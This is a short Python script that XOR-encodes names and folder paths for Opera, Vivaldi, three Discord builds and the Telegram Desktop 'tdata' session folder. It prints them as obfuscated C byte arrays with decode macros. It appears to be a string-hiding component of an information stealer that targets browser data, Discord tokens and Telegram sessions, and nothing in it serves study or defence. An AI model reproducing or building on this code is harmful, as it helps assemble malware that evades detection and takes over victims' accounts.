KEY=[0x5A,0x6D,0xCB,0x9F]
labels = [
    ('LABEL_OPERA','Opera'),
    ('LABEL_VIVALDI','Vivaldi'),
    ('LABEL_DISCORD','Discord'),
    ('LABEL_DISCORD_PTB','Discord PTB'),
    ('LABEL_DISCORD_CAN','Discord Canary'),
    ('LABEL_TELEGRAM','Telegram'),
    ('DISCORD_PATH','discord'),
    ('DISCORD_PTB_PATH','discordptb'),
    ('DISCORD_CAN_PATH','discordcanary'),
    ('TELEGRAM_TDATA','Telegram Desktop\\tdata'),
]
for n,s in labels:
    enc = ','.join(f'0x{ord(c)^KEY[i%4]:02x}' for i,c in enumerate(s))
    print(f'/* "{s}" */')
    print(f'static const BYTE ENC_{n}[] = {{{enc}}};')
    print(f'#define DEC_{n}(buf) _xd(buf, ENC_{n}, {len(s)}, 0x5A)')
    print()
